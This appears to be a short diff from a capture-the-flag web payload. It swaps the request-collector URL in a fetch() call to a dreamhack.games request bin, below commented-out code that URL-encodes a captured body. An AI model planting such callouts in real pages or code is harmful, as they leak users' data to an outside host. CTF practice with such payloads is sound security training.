@@ -6,4 +6,4 @@
       encodeURIComponent(body)
     );
   }); */
-fetch("https://cgupcon.request.dreamhack.games");
+fetch("https://scvwzrv.request.dreamhack.games");
